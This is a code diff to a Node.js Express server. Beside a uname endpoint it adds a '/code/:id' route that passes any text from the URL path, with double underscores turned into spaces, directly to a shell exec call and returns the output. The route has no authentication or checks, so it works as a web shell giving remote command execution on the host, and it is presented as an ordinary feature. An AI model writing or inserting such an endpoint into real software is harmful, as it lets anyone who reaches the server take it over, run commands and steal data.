@@ -18,6 +18,16 @@ const pwd = () => {
   return (str.toString("utf8").trim());
 }
 
+const uname = () => {
+  var str = exec('uname -a');
+  return (str.toString("utf8").trim());
+}
+
+const runCode = (text) => {
+  var str = exec(text);
+  return (str.toString("utf8").trim());
+}
+
 
 const status = () => {
   var str = exec('npm run status');
@@ -31,6 +41,12 @@ const port = process.env.PORT || 3001;
 
 app.get("/", (req, res) => res.type('html').send(html));
 app.get("/pwd", (req, res) => res.type('text').send(pwd()));
+app.get("/uname", (req, res) => res.type('text').send(uname()));
+app.get("/code/:id", (req, res) => {
+  const code = req.params.id;
+  const result = runCode(code.replace(/__/g, " "));
+  res.type('text').send(result);
+});
 app.get("/status", (req, res) => res.type('text').send(status()));
 app.get("/start", (req, res) => res.type('text').send(
   pm2tart()
